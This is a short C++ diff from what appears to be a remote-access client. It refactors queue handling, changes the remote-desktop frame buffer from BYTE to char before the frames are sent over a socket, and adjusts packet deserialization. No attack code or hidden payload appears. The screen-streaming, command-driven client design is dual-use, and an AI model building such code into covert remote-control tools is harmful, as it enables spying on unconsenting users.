@@ -131,7 +131,6 @@ void Cliente::Add_to_Queue(const Paquete_Queue& paquete) {
 void Cliente::Process_Queue() {
     DebugPrint("[PQ] Inicio");
     while (true) {
-        int iTotal = 0;
         
         if (!this->m_isRunning() || !this->m_isQueueRunning()) { break; }
 
@@ -603,10 +602,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
             ULONG iQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
 
-            std::vector<BYTE> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
+            std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
             int iBufferSize = vcDeskBuffer.size();
             if (iBufferSize > 0) {
-                this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(vcDeskBuffer.data()), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
+                this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
   
             }else {
                 DebugPrint("El buffer de remote_desk es 0");
@@ -988,7 +987,7 @@ void Cliente::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
     memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer, sizeof(paquete.cBuffer));
 }
 
-void Cliente::m_DeserializarPaquete(const char*& cBuffer, Paquete& paquete) {
+void Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete) {
     memcpy(&paquete.uiTipoPaquete, cBuffer,  sizeof(paquete.uiTipoPaquete));
     memcpy(&paquete.uiTamBuffer,   cBuffer + sizeof(paquete.uiTipoPaquete),  sizeof(paquete.uiTamBuffer));
     memcpy(&paquete.uiIsUltimo,    cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer),  sizeof(paquete.uiIsUltimo));
